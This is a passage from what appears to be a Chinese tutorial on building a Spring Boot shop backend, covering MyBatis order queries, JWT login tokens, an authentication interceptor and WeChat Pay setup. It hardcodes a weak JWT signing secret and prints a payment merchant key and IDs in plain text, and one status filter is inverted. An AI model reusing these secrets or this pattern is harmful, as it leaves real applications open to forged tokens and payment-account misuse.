    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;flish_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;flishTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cancel_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cancelTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;close_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;closeType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItems&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.OrderItemMapper.listOrderItemsByOrderId&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectOrders&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span>&gt;</span>
    select
    order_id,user_id,untitled,receiver_name, receiver_mobile,receiver_address,
    total_amount, actual_amount,pay_type,order_remark,status,delivery_type,
    delivery_flow_id,order_freight,delete_status,create_time,
    update_time,pay_time,delivery_time, flish_time,cancel_time,close_type
    from orders
    where user_id=#&#123;userId&#125;
    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>
      and status=#&#123;status&#125;
    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    limit #&#123;start&#125;,#&#123;limit&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<p>OrderItemMapper</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;OrderItem&gt; <span class="hljs-title">listOrderItemsByOrderId</span><span class="hljs-params">(String orderId)</span></span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrderItem&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_counts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyCounts&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;basket_date&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;basketDate&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_comment&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isComment&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listOrderItemsByOrderId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select
      item_id,
      order_id,
      product_id,
      product_name,
      product_img,
      sku_id,
      sku_name,
      product_price,
      buy_counts,
      total_amount,
      basket_date,
      buy_time,
      is_comment
    from order_item where order_id=#&#123;orderId&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listOrders</span><span class="hljs-params">(String userId, String status, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;
    Example example = <span class="hljs-keyword">new</span> Example(Orders.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andLike(<span class="hljs-string">&quot;userId&quot;</span>, userId);
    <span class="hljs-keyword">if</span>(status != <span class="hljs-keyword">null</span> &amp;&amp; <span class="hljs-string">&quot;&quot;</span>.equals(status))&#123;
        criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,status);
    &#125;
    <span class="hljs-keyword">int</span> count = ordersMapper.selectCountByExample(example);

    <span class="hljs-comment">//2.计算总页数（必须确定每页显示多少条  pageSize = limit）</span>
    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;


    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit);
    PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, ordersVOS);

    <span class="hljs-keyword">return</span> ResultVO.success(ordersVOPageHelper);
&#125;</code></pre>



</li>
</ul>
<ul>
<li><p>controller</p>
<pre><code class="hljs java">
<span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getList</span><span class="hljs-params">(String userId,</span></span>
<span class="hljs-function"><span class="hljs-params">                        String status,</span></span>
<span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">int</span> pageNum,</span></span>
<span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">int</span> limit)</span></span>&#123;
    <span class="hljs-keyword">return</span> orderService.listOrders(userId, status, pageNum,limit);

&#125;</code></pre>

</li>
</ul>
<h4 id="收货地址管理"><a href="#收货地址管理" class="headerlink" title="收货地址管理"></a>收货地址管理</h4><h2 id="2-JWT实现权限认证"><a href="#2-JWT实现权限认证" class="headerlink" title="2  JWT实现权限认证"></a>2  JWT实现权限认证</h2><h3 id="2-1-JWT实现"><a href="#2-1-JWT实现" class="headerlink" title="2.1 JWT实现"></a>2.1 JWT实现</h3><h4 id="导入JWT依赖"><a href="#导入JWT依赖" class="headerlink" title="导入JWT依赖"></a>导入JWT依赖</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h4 id="生成对应的token并返回给前端"><a href="#生成对应的token并返回给前端" class="headerlink" title="生成对应的token并返回给前端"></a>生成对应的token并返回给前端</h4><pre><code class="hljs java"><span class="hljs-comment">// 验证成功则生成对应的token</span>
<span class="hljs-comment">// 使用jwt生成token</span>
JwtBuilder builder = Jwts.builder();
Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
JwtBuilder jwtBuilder = builder.setSubject(username)    <span class="hljs-comment">//设置subject</span>
    .setIssuedAt(<span class="hljs-keyword">new</span> Date())        <span class="hljs-comment">// 设置token生成的时间</span>
    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// 设置userid为token的唯一id</span>
    .setClaims(map)                 <span class="hljs-comment">// map中可以存放用户的角色和权限信息</span>
    .setExpiration(<span class="hljs-keyword">new</span> Date(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// 设置token的过期时间 为两天</span>
    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// 设置token的加密方式和加密密钥</span>

String token = jwtBuilder.compact();   <span class="hljs-comment">// 获取token</span>
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, token, user);</code></pre>

<h4 id="前端进行登录验证时获取对应的token"><a href="#前端进行登录验证时获取对应的token" class="headerlink" title="前端进行登录验证时获取对应的token"></a>前端进行登录验证时获取对应的token</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p>
<h4 id="JWT进行token解析"><a href="#JWT进行token解析" class="headerlink" title="JWT进行token解析"></a>JWT进行token解析</h4><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);
&#125;<span class="hljs-keyword">else</span> &#123;
    JwtParser parser = Jwts.parser();
    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
    <span class="hljs-keyword">try</span>&#123;
        <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
        Claims body = claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
        String subject = body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
        String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;token不合法请重新登录！&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;
    <span class="hljs-keyword">catch</span> (Exception e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;未知错误&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;</code></pre>

<h4 id="使用拦截器验证token"><a href="#使用拦截器验证token" class="headerlink" title="使用拦截器验证token"></a>使用拦截器验证token</h4><ul>
<li><p>创建拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.jsonwebtoken.*;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
        String token = request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span> (token == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;
            doResponse(response, <span class="hljs-string">&quot;请先登录！&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            JwtParser parser = Jwts.parser();
            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
                Claims body = claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
                String subject = body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
                String key1 = body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token不合法，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                doResponse(response,<span class="hljs-string">&quot;未知错误！&quot;</span>);
            &#125;

            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        &#125;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
        ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);
        String string = JSON.toJSONString(resultVO);
        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);
        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
        PrintWriter writer = response.getWriter();
        writer.write(string);
        writer.flush();
        writer.close();
    &#125;

&#125;
</code></pre>



</li>
</ul>
<ul>
<li><p>配置拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 拦截器的配置类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> </span>&#123;
        <span class="hljs-comment">// registry是拦截器的注册器</span>
        <span class="hljs-comment">// 将自己创建的拦截器加入进来 即可实现拦截功能</span>
        registry.addInterceptor(checkTokenInterceptor)
        .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// 拦截所有路径</span>
        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// 除了用户登录和注册路径</span>
    &#125;
&#125;
</code></pre>

</li>
</ul>
<h3 id="2-2-通过header传递token"><a href="#2-2-通过header传递token" class="headerlink" title="2.2 通过header传递token"></a>2.2 通过header传递token</h3><blockquote>
<p>前端访问受限资源时，都必须携带token发送请求，token可以放在请求行(params)、请求头(header)以及请求体(data)，但是一般默认放在请求头中</p>
</blockquote>
<ul>
<li><p>前端使用axios</p>
<pre><code class="hljs js">axios(&#123;
    url:url,
    method:<span class="hljs-string">&quot;get&quot;</span>,
    headers:&#123;
        token:token
    &#125;,
    params:&#123;
        userId:userId
    &#125;
&#125;)</code></pre>



</li>
</ul>
<ul>
<li><p>浏览器的预检机制</p>
<p>只要是带自定义header的跨域请求，在发送真实请求前都会先发送OPTIONS请求，浏览器根据OPTIONS请求返回的结果来决定是否继续发送真实的请求进行跨域资源访问。所以复杂请求肯定会两次请求服务端。</p>
<p>因此需要在拦截器中加入以下代码，必要响应第一次的OPTIONS请求后，才能收到第二次的GET请求。</p>
<pre><code class="hljs java">String method = request.getMethod();
System.out.println(method);
<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>.equals(method))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
&#125;</code></pre>
</li>
<li></li>
</ul>
<h2 id="3-通用实体类"><a href="#3-通用实体类" class="headerlink" title="3.通用实体类"></a>3.通用实体类</h2><p>3.1 用于响应的实体类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.vo;

<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModel;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModelProperty;
<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> javax.annotation.Resource;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ResultVO</span> </span>&#123;

    <span class="hljs-comment">//响应给前端的状态码</span>
    <span class="hljs-meta">@ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> code;

    <span class="hljs-comment">//响应给前端的提示信息</span>
    <span class="hljs-meta">@ApiModelProperty(&quot;响应提示信息&quot;)</span>
    <span class="hljs-keyword">private</span> String msg;

    <span class="hljs-comment">//响应给前端的数据</span>
    <span class="hljs-meta">@ApiModelProperty(&quot;响应数据&quot;)</span>
    <span class="hljs-keyword">private</span> Object data;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">(String msg)</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, msg, <span class="hljs-keyword">null</span>);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">success</span><span class="hljs-params">(Object obj)</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, obj);
    &#125;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">failed</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title">failed</span><span class="hljs-params">(String msg)</span></span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, msg, <span class="hljs-keyword">null</span>);
    &#125;

&#125;
</code></pre>





<h2 id="4-微信支付"><a href="#4-微信支付" class="headerlink" title="4 微信支付"></a>4 微信支付</h2><blockquote>
<p>通过微信平台为商家提供代收款服务</p>
</blockquote>
<h3 id="4-1-商户注册微信支付业务"><a href="#4-1-商户注册微信支付业务" class="headerlink" title="4.1 商户注册微信支付业务"></a>4.1 商户注册微信支付业务</h3><ul>
<li>商户编号：1497984412</li>
<li>商户账号AppID：wx632c8f211f8122c6</li>
<li>商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC</li>
</ul>
<h3 id="4-2-商户向微信申请支付订单，即支付短链接"><a href="#4-2-商户向微信申请支付订单，即支付短链接" class="headerlink" title="4.2 商户向微信申请支付订单，即支付短链接"></a>4.2 商户向微信申请支付订单，即支付短链接</h3><ul>
<li><p>导入微信支付的依赖</p>
<pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.wxpay<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wxpay-sdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>创建WXPayConfig，重写里面的方法，设置自己的AppID，商户id，密钥，</p>
<pre><code class="hljs java">
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPayConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WXPayConfig</span> </span>&#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAppID</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wx632c8f211f8122c6&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMchID</span><span class="hljs-params">()</span> </span>&#123;
